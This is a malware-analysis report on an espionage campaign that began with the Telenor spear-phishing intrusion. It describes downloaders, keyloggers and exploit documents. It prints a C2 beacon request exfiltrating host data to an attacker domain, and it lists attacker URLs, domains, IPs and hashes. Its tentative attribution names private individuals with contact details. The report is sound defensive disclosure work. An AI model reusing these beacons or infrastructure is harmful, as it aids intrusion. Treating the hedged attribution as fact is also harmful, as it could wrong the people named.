In this report we detail a cyberattack infrastructure that appears to be Indian in origin . 
This infrastructure has been in operation for at least three years , more likely close to four years . 
The purpose of this framework seems predominantly to be a platform for surveillance against targets of national security interest ( such as Pakistan ) , but we will also show how it has been used for industrial espionage against the Norwegian telecom corporation Telenor and other civilian corporations . 
None of the information contained in the following report is intended to implicate any individual or entity , or suggest inappropriate activity by any individual or entity mentioned . 
On Sunday March 17th 2013 the Norwegian newspaper Aftenposten reported that the telecommunications giant Telenor had filed a case with Norwegian criminal police ( `` KRIPOS '' ) over what was perceived as an unlawful intrusion into their computer network . 
The infection was reported to have been conducted via `` spear phishing '' emails sent to people in the upper tiers of management . 
Initially , we had no information or visibility into this case . 
However , after some time Norwegian CERT ( NorCERT ) shared some data from the event , which included md5 hashes of malicious files and information about which Command and Control servers were used . 
However , the data we were given acted as a starting point for more data mining , and within a short period of time it became obvious that we were seeing a previously unknown and very extensive infrastructure for targeted attacks . 
This paper is the result of the ensuing investigation . 
The samples we have uncovered seem to have been created from approximately September 2010 until the present day . 
It appears 2012 was a very active year for this group , which saw escalation not only in numbers of created malware files but also in targets . 
There is no sign that the attacks will slow down in 2013 , as we see new attacks continuously . 
> We would like to thank NorCERT , the Norwegian National Security Authority , Telenor and Telenor SOC for their assistance and cooperation during the investigation of this case . 
We would also like to thank ESET for graciously sharing information they were in possession of , and finally we would like to express our gratitude to the people who created our database and analysis systems . 
These systems enable us to do the data correlation needed to find needles in haystacks , so their creators own a large part of this paper as well . 
C & C , C2 , CC : Command- and Control server . 
Typically used about the computer the malware connects to in order to report status . 
Drop : The online location where malware delivers stolen information . 
FUD : One meaning of this acronym is `` Fear , Uncertainty and Doubt '' , but in the malware underground FUD means Fully UnDetectable , i.e . 
the program is not detected by antivirus tools . 
MD5 : A so-called hash – i.e . 
a number calculated on the basis of data that identifies these with high confidence . 
MD5 's in this paper are used to identify files . 
RTF : Rich Text Format , a document format SFX : Self-extracting . 
Executable programs that are also archives , and which extract and sometimes execute the archive content when run . 
Sinkholing : A technique of re-registering a domain that has previously been used for malicious purposes . 
By doing this , machines that are still infected connect to our computer instead of the attacker 's , and we can log the connection attempts . 
Spear phishing : To send emails with malicious content ( attachments , links , or fraudulent messages ) to specific persons of particular interest . 
Zero day exploits : Program code to attack software vulnerabilities for which there is no patch . 
Initially we had no knowledge of the malware samples involved in the attack on Telenor . 
However , some days after the attack we received MD5 hashes of the samples used . 
We only found two of these samples in our own datasets , but we later directly received copies of most other samples connected with the case ( Appendix A ) . 
The initial spear phishing mail contained two files as attachments – a document named `` 220113.doc '' , and an executable file `` few important operational documents.doc.exe '' . 
( MD5 bd52237db47ba7515b2b7220ca64704e ) . 
This was a selfextracting ( SFX ) ZIP archive that contained two files , as shown below . 
When run , the installer will execute the included `` conhosts.exe '' file and open the decoy document '' legal operations.doc '' . 
`` legal operations.doc '' and `` 220113.doc '' also included in the mail are identical save for their size , and are actually specially crafted RTF files designed to trigger a software vulnerability ( CVE-2012-0158 ) in Microsoft Common Controls , typically triggered in Microsoft Word . 
If the vulnerability is triggered , embedded code in the document will be run . 
This code is encrypted , but after decryption its real purpose becomes visible : The files conhosts.exe ( MD5 02d6519b0330a34b72290845e7ed16ab ) and windwn.exe ( MD5 bfd2529e09932ac6ca18c3aaff55bd79 ) are both minimally obfuscated Visual Basic executables . 
They connect to the Command and Control server wreckmove.org ( 188.240.47.145 ) via HTTP on port 80 , using a peculiar and recognizable pattern : GET /flaws/snwd.php ? tp=1 & tg= [ ID ] & tv=Error [ ] & ts= [ PLATFORM ] & mt= [ account ] & tr= [ NoFiles ] & Y1Y5F2 HTTP/1.1 Accept : */* Accept-Encoding : gzip , deflate User-Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET 
CLR 2.0.50727 ; .NET 
CLR 3.0.04506.648 ; .NET 
CLR 3.5.21022 ; .NET4.0C 
) Host : wreckmove.org Connection : Keep-Alive Other samples found connected to the case were Delphi information stealers ( some highly targeted , down to individual username ) , file splitter tools , C++ information stealers ( keyloggers , screen grabbers and file harvesters ) , and various other malware written in Visual Basic . 
The following C & C domains/IP addresses were observed used in the attack : wreckmove.org infocardiology.biz enlighten-energy.org researcherzone.net 151.237.188.167 gadgetscorner.org On the 3rd of April the attackers created another attack package and placed it on the URL http : //mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz/ 01084204_Telenor_New_Satellite_Client_Agreement_30032013.zip . 
The package is quite similar to the first , though the decoy document is this time a Powerpoint presentation , `` 01084204_Telenor_New_Satellite_Client_Agreement_30032013.ppt '' . 
This is an apparently legitimate Telenor draft written in 2002 using a Norwegian PowerPoint installation . 
The included trojan downloader connects this time back to the domain torqspot.org . 
The attackers also created the subdomain internet-security-suite-review.toptenreviews.com.infocardiology.biz , a spoof of the real toptenreviews.com site . 
On this site there 's what appears to be an installer for the Bitdefender antivirus product ( bitdefender_tsecurity.zip , md5 62b702a15a762692eda296b0aea270f9 ) , but the zip file contains both a real installer and a Visual Basic trojan identical to the one used against Telenor . 
The Telenor-related attack seems not to be over . 
The behaviour pattern and the file structure of known files made it possible to search internal and public databases for similar cases . 
The large amount of new malware being created makes it infeasible to conduct malware-related investigations of any scale without strong database support . 
In our case , we preserve the behavioural information of all files processed by our internal bank of Norman MAG2 automatic analysis systems . 
There are also several public and commercial databases available for additional data mining , and Google is invaluable . 
The amount of malware we found through this was surprisingly large , and it became clear that the Telenor intrusion was not a single attack but part of a continuous effort to attack and compromise governments and corporations around the world . 
While investigating the extra cases we identified , we accidentally discovered that a number of their C & C servers contained world readable folders . 
We were able to navigate into these and secure the data stored there . 
The data contained in these folders were mainly connection logs , keylogs and other uploaded data from computers affected with malware . 
Many of the collected logs were from automated analysis systems belonging to security companies , but not all . 
An important find we did on these servers were additional malicious executables , probably meant to be served to infected users . 
Some of these executables were digitally signed with a certificate which was revoked in 2011 : Searching our certificate databases we found a large number of other executables similarly signed , none of which were found to be innocent applications . 
In almost all cases , the domains registered by the attackers are `` privacy protected '' . 
This means that the registrant has paid the domain registrar to withhold identity information related to the registration . 
This is done almost to perfection . 
Another feature is that almost all websites belonging to this attacker has their robots.txt set to `` disallow '' to stop them from being crawled . 
However , by searching historical IP data for the IP addresses of domains known to be involved we found a number of other domains likely belonging to the same infrastructure . 
These domains were then further verified against malware samples to ascertain valid connection to attackers . 
Some care needs to be taken when working with IP addresses , as there are possibilities of false correlations on , for example , domain parking IP addresses , sinkholes and webhosting servers . 
Additional data may be gleaned by querying the IP addresses themselves . 
Many have set up a default ESMTP ( mail ) server on port 587/tcp , which responds with a configured banner . 
For example , the domain onlinestoreapp.net ( used by malware MD5 a7b5fce4390629f1756eb25901dbe105 ) resolved to the IP address 37.59.231.161 , and this happens when connecting to that IP on ESMTP : All of this enabled us to draw a domain map over the infrastructure ( next page ) . 
This map is probably larger than shown here ; there might be domains owned by the attackers that are not plotted on this map because we could not prove they were malicious , and many domains we have not found yet . 
Conversely , many of the domains plotted were used in attacks years ago and may never be again . 
Whereas other targeted attack actors often rely extensively on the use of software exploits to plant their malware , this is rarely done by this attack group . 
As far as we can tell they are only using known vulnerabilities ; no zero day attacks . 
The first exploit we observed was included in the RTF files used in the Telenor attack . 
The exploit in question was CVE-2012-0158 , a very common vulnerability to exploit . 
The actual document is binary very similar to other documents ( 51ee31f234db61b488647915f8d7d4c8 , 00978e4b81ac577f328d6add75d0890e , 17a31d1075ebce41ba48a9efacb79d28 ... 
) which have been used in other targeted attacks by these threat actors . 
The shellcode contains a date check , which means it will stop working after a certain date . 
In the Telenor case , the date was February 16th 2013 , and in the most recent variations the timeout date is set to May 21nd 2013 . 
If the exploit is triggered before the timeout date the shellcode does two different things : • Posts system info ( machinename , timezone , ID , running processes ) to a PHP script residing on the website random123.site11.com . 
• Downloads and executes an executable from remote sites . 
We have seen softmini.net , www.infocardiology.biz , www.getmedia.us , www.technopenta.org , and autowidge.org used for this . 
• The executables downloaded have usually themselves been downloaders . 
In a couple of cases we have observed final payload to be Dark Comet , a well-known backdoor trojan , but unusual for this group to use . 
When we investigated the attacker domain structure we found more exploit code . 
This time it was implemented as a script in the main web page of the domain you-post.net . 
The exploit is this time CVE- 2012-4792 , an Internet Explorer vulnerability . 
When it triggers it downloads and runs a malicious executable from the domain softmini.net ; also the domain used by two of the three documents mentioned above . 
Softmini.net seems to be a hub for exploitcode ; its subdomain get.adobe.flash.softmini.net contains an active Java exploit ( CVE-2012-0422 ) which attempts to install the same trojan as the IE exploit above . 
Most of the first stage malware we 've seen used in attacks are variants of Smackdown , a large family of Visual Basic downloaders which for the most part seem to be written by a person calling himself `` Yash '' or `` Yashu '' . 
These have evolved over time and are using different levels of obfuscation on text strings . 
Typically the trojan begins by uploading system information to a PHP script on the C & C server . 
The attacker can decide separately which infected machine should receive additional malware . 
The second stage malware is usually Hanove but other malware families are also used . 
The second stage malware are often variants of HangOver , information stealers written in C++ . 
They appear to be written over a common framework as many internal functions are identical , but overall functionality can vary quite a bit from one subtype to another . 
The first versions of these may have been based on code from an innocent backup utility as the word `` backup '' is often present . 
Hanove Uploaders recursively scan folders looking for files to upload . 
What kind of files they look for are usually defined in resources as an extension list , and these lists vary . 
Here are a few examples : Hanove keyloggers set up keyboard hooks or polls to capture keypresses and log these to a text file . 
Some variants capture other data as well , such as clipboard content , screenshots , titles of open windows and content of browser edit fields . 
Timed events are set up to upload the data to the remote server . 
The stolen data are uploaded to remote servers by FTP or HTTP . 
A typical HTTP request looks like this : UserAgent strings vary between versions . 
The following have been seen in connection with this family : Boundary parameters vary between versions . 
The following have been seen in connection with this family : F39D45E70395ABFB8D8D2BFFC8BBD152 , 90B452BFFF3F395ABDC878D8BEDBD152 FFF3F395A90B452BB8BEDC878DDBD152 , 5A9DCB8FFF3F02B8B45BE39D152 5A902B8B45BEDCB8FFF3F39D152 , 78DDB5A902BB8FFF3F398B45BEDCD152 2BB8FFF3F39878DDB5A90B45BEDCD152 , 905ABEB452BFFFBDC878D83F39DBD152 D2BFFC8BBD152F3B8D89D45E70395ABF , 8765F3F395A90B452BB8BEDC878 90ABDC878D8BEDBB452BFFF3F395D152 , F12BDC94490B452AA8AEDC878DCBD187 String content consists of some strings largely static between variants , and some that vary . 
Non-static strings are browser UserAgent strings , MIME boundary tags , mutexes , domain names , paths , and registry keys , which also may be obfuscated by being fragmented . 
Many Hanove variants use a simple rotating encoding scheme to hide the interesting strings . 
For example , the domain `` wearwellgarments.eu '' is hidden as `` xfbsxfmmhbsnfout/fv '' and the word `` php '' becomes `` qiq '' . 
Different variants are frequently given internal names , visible through debug paths included in the binary . 
Such internal names used include `` HangOver '' , `` Ron '' , `` Dragonball '' , `` Tourist '' , `` Klogger '' , '' FirstBlood '' and `` Babylon '' . 
There are several other malwares and tools in use . 
See appendix C for more indicators . 
We have direct knowledge of only one attack – the one against Telenor . 
During this investigation we have obtained malware samples and decoy documents that have provided indications as to whom else would be in the target groups . 
We have observed the usage of peculiar domain names that are remarkably similar to existing legitimate domains . 
We have also obtained sinkhole data for a number of domains in question and found open folders with stolen userdata in them ; enough to identify targets down to IP and machine name/domain level . 
This showed a geographical distribution where Pakistan was the most affected in volume , but also showed a multitude of other countries being represented . 
Note that these data should be taken as indicative only . 
IP counts are misleading for many reasons . 
One machine can generate many IP addresses , and some IP addresses are probably lab machines . 
However , the indication that Pakistan is the most prevalent target seems solid . 
In the following pages we 've highlighted some of the files we have seen used to attack organizations in different countries . 
As can be seen from the examples the attackers have gone to great lengths to make the social engineering aspect as credible and applicable as possible . 
The most obvious target seems to be Pakistan . 
As is visible above , computers in Pakistan are by far the most active in connecting to malicious domains . 
We found logs in the open drop folders that contained suggestive data , such as this snippet from a 2012 log entry ( subdomain redacted ) : Host Name : PC-PS2CHAIRMAN Registered Owner : admin Time Zone : ( GMT+05:00 ) Islamabad , Karachi Domain : ****.gov.pk Sinkhole-logged HTTP requests are also informative , such as this seemingly from a Pakistani embassy : '' GET /sdata/shopx.php ? fol=EMBASSYOFPAKIST-Embassy % 20of % 20Pakistan ... 
.. 
'' Decoy files tailored towards Pakistan revolve around the ongoing conflicts in the region , regional culture and religious matters . 
Additional examples can be found in Appendix B . 
China is another country which apparently has been targeted to some extent . 
For example , we found a data dump and keylog seemingly harvested from a computer belonging to a Chinese academic institution . 
This dump was generated in July 2012 and contains Word documents , PowerPoint presentations and images . 
Decoys are also present , but not in the amount as is seen against Pakistani targets . 
This is a political secessionist movement aiming to create a sovereign Sikh nation in the region of Punjab in India . 
Violent episodes between supporters of the Khalistan movement and government forces have occurred through history since the movement 's creation in 1971 . 
Examples of malware apparently aimed at the movement are md5's a4a2019717ce5a7d7daec8f2e1cb29f8 and f70a54aacde816cb9e9db9e9263db4aa . 
The former appears to be this file : http : //f00dlover.info/Khalistan/Victims_want_Sajjan_Kumar_punished.doc.zip It is interesting to note that f00dlover.info has historically shared the IP address 173.236.24.254 with many other domains belonging to this infrastructure – for example the domain researcherzone.net which was used in the Telenor intrusion . 
There are also a number of domains with active web pages that used to exist on this IP ; for example khalistancalling.com . 
Khalistancalling.com has since moved on to another bad IP ( 46.182.104.83 ) and must be considered owned by the attackers . 
The Nagaland ( or Nagalim ) movement is another secessionist group aiming to create a sovereign homeland for the Naga people living in North-Eastern India and North-Western Burma . 
We have seen at least two attacks apparently aimed at them . 
A sample from 2010 , md5 168f2c46e15c9ce0ba6e698a34a6769e , showed a scanned document which appears to be a letter from the `` President of Nagalim '' . 
The malware sample also installed an executable which in turn connected back to the domain zeusagency.org on the IP 176.31.65.124 . 
Zeusagency.org has hosted different malware ; one ( 3105b020e2bd43924404bc4e3940191b ) connected to fistoffury.net on the IP 176.31.65.126 . 
The IP range 176.31.65.124 - 176.31.65.127 contains a series of domains used by Gimwlog and Auspo malwares . 
These are somewhat different from the standard Hanove series , though functionality is roughly equivalent . 
Another malicious installer ( md5 f1799d11b34685aa209171b0a4b89d06 ) contained the following decoy : While the Telenor case was most likely industrial espionage , we were initially unaware of other `` non- strategic/political '' targets by this attack group , but during our research we discovered several related attack files that were clearly targeting businesses . 
As can be seen in the example below , the social engineering aspects are more related to business content . 
We want to emphasize that except in the case of BUMI PLC , we have no information to suggest that any of the organizations named in the following pages have been compromised . 
However , the available information strongly indicates that they were targets of interests for the attackers . 
Likely target : Eurasian Natural Resources Corporation ( ENRC ) This company which is headquartered in London has operations in multiple countries , notably in Kazakhstan . 
The following malwares appear to be aimed at ENRC . 
ENRC__DEBT__INVESTORS__2012__for__your__Reference.exe ( MD5 e40205cba4e84a47b7c7419ab6d77322 ) Deatils_for_the_ENRC_Board_Meeting_X1098977e79.exe ( MD5 a5a740ce2f47eada46b5cae5facfe848 ) Details_for_the_ENRC_Board_Meeting_X10FR333_2012.exe ( MD5 2895a9b0cf22cd45421d634dc0f68db1 ) Detail_description_of_ferro_chrome_silicon_and_ferro_chrome.exe ( MD5 2102a18dc20dc6654c03e0e74f36033f ) Gerhard_Ammann_Article_Content_From_Wikipedia.exe ( MD5 d96aa87c25c9c491bee97aad65bafc9e ) When searching for known instances of domains belonging to the attack infrastructure , we found a published incident report made by Context Information Security . 
This report details how the Chairman of Bumi PLC , Mr Samin Tan , had been exposed to a spear-phishing attack in July 2012 . 
Bumi is an international mining group listed on the London Stock Exchange . 
Both the domains mentioned in this report have been connected to the attack group investigated . 
For example , the malware executable `` dua2alhycox12.exe '' ( c94267ba9c92f241379cdceed58777dc ) connects to hycoxcable.com , which anoniemvolmacht.com historically acted as name server for . 
The latter domain has also shared IP with the malicious domain chronicleserv.org . 
Likely target : Porsche Informatik A malware using the name `` webmailapp.exe '' ( 22a3a1d5a89866a81152cd2fc98cd6e2 ) is a self-extracting archive containing several files , among them a batch file opening a shortened URL pointing to Porsche Holding 's webmail front in Austria . 
Target must be assumed to be persons affiliated with Porsche . 
Again , we have no information as to whether any intrusion has occurred . 
Possible target : Restaurant industry It appears unlikely that the restaurant and food industry should be the victim of targeted attacks . 
However , that 's how it appears . 
One indicator is the decoy file below , taken from the malicious executable `` Horsemeat_scandal_another_Irish_company_suspends_burger_production.exe '' ( f52154ae1366ae889d0783730040ea85 ) . 
Another indicator is the use of certain domain names , like the malicious bluebird- restaurant.co.uk.infocardiology.biz vs the legitimate bluebird-restaurant.co.uk . 
The latter is a restaurant in Chelsea , UK . 
Likely target : Chicago Mercantile Exchange While investigating the malicious domain web-mail-services.info , we found a number of other domains that had shared the IP address 188.95.48.99 with it . 
One of these domains was cmegroups.net , a spoof of cmegroup.com ; the domain belonging to Chicago Mercantile Exchange . 
CME is the world 's largest futures exchange company . 
An entry on WIPO , the UN arbitration body for domain name disputes , shows that a complaint regarding this domain name was leveled by CME against PrivacyProtect.org in 2012 . 
The complaint was not disputed , and domain transferred to CME . 
However , the most interesting information is found in the case details . 
An interesting question is of course whether there were any attachments to this mail . 
Other suggestive domain names that have been used include : server721-hans.de-nservers.de.continuelogs.info vs. server721-han.de-nserver.de : The latter is the mail server for several German businesses , for example restaurants . 
www.alintiqad-newsonline.blogspot.com.continuelogs.info vs www.alintiqad.com : The latter is a Lebanese newspaper in Arabic . 
account.istpumpenunddosiertechnik.de.continuelogs.info vs istpumpenunddosiertechnik.de : The latter is a German producer of pumps for high-viscosity fluids . 
deltaairlines.com.config.services.data.sesion.24s.digitalapp.org.evitalcare.org vs deltaairlines.com : Delta Airlines . 
mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz vs mail.telenor.no : Telenor lynberrg.com vs lynberg.com : The latter belongs to Lynberg & Watkins , a US-based law firm . 
mail.carmel.us.exchweb.bin.auth.owalogon.asp.serviceaccountloginservicemail.info vs mail.carmel.us : The latter is the webmail address of Carmel & Carmel , a US-based law firm . 
armordesigns.com.webmail-login.php.web-mail-services.info vs armordesigns.com : The latter is a US-based manufacturer of composite materials for armor : We do not know ( yet ) what purpose all these domains have , but it 's hard to imagine that the name spoofing is done by anything but malicious intent ; it is a common tactic in targeted attacks . 
The continued targeting of Pakistani interests and origins suggested that the attacker was of Indian origin . 
Curiously , many of the executables we uncovered from related cases contained cleartext project and debug path strings ( see Appendix D for full list ) . 
It is not very common to find malware with debug paths , but these particular threat actors did not seem to mind leaving such telltale signs , or maybe they were unaware of their presence . 
These paths gave more indicators that the attackers were Indian . 
First , many of the Visual Basic keyloggers contained the name `` Yash '' , which might be an abbreviation for several Indian names . 
The trojans used against Telenor did not contain any such person name , but the Visual Basic project name is clearly related to others : Telenor case ( 02d6519b0330a34b72290845e7ed16ab , bfd2529e09932ac6ca18c3aaff55bd79 ) '' C : \miNaPro.vbp '' Related cases ( 4ad80ff251e92004f56bb1b531175a49 , 3d6a8b2df08443c2aa4b6a07a9b55b16 ) '' D : \YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\NewSmack ( sep2012 ) \miNaPro.vbp '' This similarity is not coincidental ; these trojans are based on the same code and exhibit similar behaviour . 
This and other text strings we initially saw gave further hints towards Indian attackers .

: \YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\.. There are many diverging project paths which points towards different persons working on separate subprojects , but apparently not using a centralized source control system . 
The projects seem to be delegated into tasks , of which some seem to follow a monthly cycle . 
There are hints at team structures , like the string `` VB Team Matrix Production '' found in a sample ( fa6d2483f766f8431b6c0a8c78178d48 ) , an indication that a separate team works with Visual Basic development . 
Some series of malware contain strings like `` delivered '' , which , together with the loose project structures may indicate that development work is being outsourced . 
In a great number of isolated cases and contexts , the word `` Appin '' shows up and there seems to be some connection with the Indian security company called Appin Security Group . 
By this , we are not implicating or suggesting inappropriate activity by Appin . 
Maybe someone has tried to hurt Appin by falsifying evidence to implicate them . 
Maybe some rogue agent within Appin Security Group is involved , or maybe there are other explanations . 
Getting to the bottom of that is beyond our visibility . 
For example , the strings `` Appin '' , `` AppinSecurityGroup '' , and `` Matrix '' are frequently found inside executables . 
One example of this peculiarity is debug paths inside malware files : C : \BNaga\backup_28_09_2010\threads tut\pen-backup\BB_FUD_23\Copy of client\ Copy of client\appinbot_1.2_120308\Build\Win32\Release\appinclient.pdb C : \BNaga\kaam\Appin SOFWARES\RON 2.0.0\Release\Ron.pdb C : \BNaga\SCode\BOT\MATRIX_1.2.2.0\appinbot_1.2_120308\Build\Win32\Release\deleter.pdb C : \Documents and Settings\Administrator\Desktop\Backup\17_8_2011\MATRIX_1.3.4\CLIENT\ Build\Win32\Release\appinclient.pdb D : \Projects\Elance\AppInSecurityGroup\FtpBackup\Release\Backup.pdb One should note that anyone can add or change such text strings . 
As mentioned , the privacy-protection of domain registrations is almost perfect , but only almost . 
There are a large number of domains used , and a few of these have been suspended and lost their privacy protection . 
For example , the following malicious domains all used the same registration information NITR0RAC3.COM , VALL3Y.COM , S3RV1C3S.NET , GAUZPIE.COM , BLUECREAMS.COM : Registrant : NA Prakash ( mail @ gmail.com ) Jain TY-76 , Kohat Enclave Delhi Delhi,110034 IN Tel . 
+011.9873456756 Identical registration information is also used for other domains that seem unrelated to the attack infrastructure , like hackerscouncil.com which May 12th 2011 had the following entry ( source : gwebtools.com ) . 
April 3th 2011 , a little over a month before the registration entry above , hackerscouncil.com was registered by Appin Technologies . 
This is possibly a coincidence . 
HACKERSCOUNCIL.COM Registrant : Appin Technologies Rakesh Gupta ( rakesh.gupta @ appinonline.com ) 9th Floor , Metro Heights , NSP , PitamPura , Delhi Delhi,110034 IN Tel . 
+91.1147063300 Creation Date : 17-Sep-2009 Expiration Date : 17-Sep-2011 The domain piegauz.net , which was used as a Command and Control domain for several trojan configurations was created April 21st 2010 and had the following initial registration information : PIEGAUZ.NET Registrant : PrivacyProtect.org Domain Admin ( contact @ privacyprotect.org ) P.O . 
Box 97 Note - All Postal Mails Rejected , visit Privacyprotect.org Moergestel null,5066 ZH NL Tel . 
+45.36946676 One trojan using this domain ( md5 4a44b6b6463fa1a8e0515669b10bd338 ) was submitted to the ThreatExpert analysis service October 28th 2010 , at which time the domain was operational and accepted uploads from the malware . 
Three days later , October 31st 2010 , the domain got suspended , which removed its privacy protection : PIEGAUZ.NET Registrant : Appin Technologies Rakesh Gupta ( rakesh.gupta @ appinonline.com ) 9th Floor , Metro Heights , NSP , PitamPura , Delhi Delhi,110034 IN Tel . 
+91.1147063300 Creation Date : 21-Apr-2010 Expiration Date : 21-Apr-2011 The domain bluecreams.com was initially registered by Appin Security Solutions Pvt . 
Ltd. Sept 17th 2009 . 
The day after it was put under privacy protection . 
In the period from end of June 2010 to February 2011 it was documented as download domain for several trojans . 
It was suspended Apr 18th 2011 and then displayed the already mentioned Prakash Jain as registrant . 
Another example is the domain zerodayexploits.org . 
This domain has a history of resolving to a series of malicious IP addresses used for malware attacks ( 173.236.24.254 , 8.22.200.44 ) . 
This web site which offers bounties for zeroday exploits , claims to be founded by `` Appin Morpheus '' and powered by Appin . 
Also the live behaviour of some domains shows the word Appin . 
The malicious domains alr3ady.net , wearwellgarments.eu , ezservicecenter.org , secuina.net , go-jobs.net , shoperstock.com and maxtourguide.info inhabit the IP space 178.32.75.192 - 178.32.75.197 . 
All these IP 's return a recognizable ESMTP banner : Other interesting indicators were found when we examined the domain softservices.org ; a domain which has held several of the known malicious IP addresses used by this group ( 46.182.104.83 , 94.185.81.153 , 89.207.135.242 ) . 
However , even if the domain was obviously connected , we could find no malware that used it . 
Instead , we found this forum post on the Nokia developer forum : The interesting bit was found further down this thread , where the developer posted a snippet of source code : We then found the apparent developer 's profile on Elance , an online employment service for freelance programmers . 
Based on this we suspect that there are or have been projects to develop mobile malware by this group , even if we have not found any related mobile malware in our databases . 
Mantra Tech Ventures is the registration service for several of the malicious domains that have been in use . 
The service first came to our attention because it was used for registering the Command & Control domains cobrapub.com , mymyntra.net , and n00b4u.com . 
In addition , Mantra Tech Ventures owns abhedya.net , which seems to be a name server service for domains registered by them . 
Abhedya has been used by several sites in the attack infrastructure like currentnewsstore.com , crvhostia.net , webmicrosoftupdate.net and fuzzyfile.net . 
Abhedya is also visible in the PIEGAUZ.NET name server history : abedhya.net is currently a privacy protected domain , but it used to be registered by one Arun Bansal , CEO and founder of Mantra Ventures and the `` Ethical Hacking Institute '' hackingtruths.org . 
Domain Name : ABHEDYA.NET Registrant : HackingTruths Arun Bansal ( arun @ hackingtruths.org ) *** ********* ***** ******* ****** Delhi,110085 IN The domain appinonline.com is also hosted on the cloud service mantragrid.com , a Mantra Ventures company . 
There is another interesting detail : We found a connection log on one of the open drop folders earlier mentioned . 
This log folder was named `` test '' and data in it was uploaded from an IP belonging to the French provider OVH . 
The log contained data from a lab test PC whose registered owner was `` innefu '' . 
There is indeed an Indian information security consulting group named Innefu . 
The domain innefu.com was registered by the same Arun Bansal . 
Innefu also hires `` ethical hackers '' : It is possible that Mantra Tech Ventures hosted the malicious sites by coincidence , and it is possible that INNEFU ( if indeed the mentioned log came from them ) just happened to run the malware in an automatic test system like many other security vendors do as part of their malware analysis research . 
When researching the attack against Telenor we were able to uncover that actors apparently operating from India have been conducting attacks against business , government and political organizations around the world for over three years . 
There are also indicators of involvement by private sector companies or persons connected to these , though these data are circumstantial and may be attempts to implicate said companies . 
We have no visibility into whether the attacks were done on behalf of others , and if so who commissioned them or whether all attacks were commissioned by one entity or by several . 
The methods used were primarily based on different social engineering tactics rather than exploits , but history has shown that social engineering based attacks can be very successful , confirmed once again by looking at the data we have been able to uncover . 
Organizations today need to realize that it 's not a matter of whether they will be compromised but a question of when and have a plan in place for how to deal with those compromises .
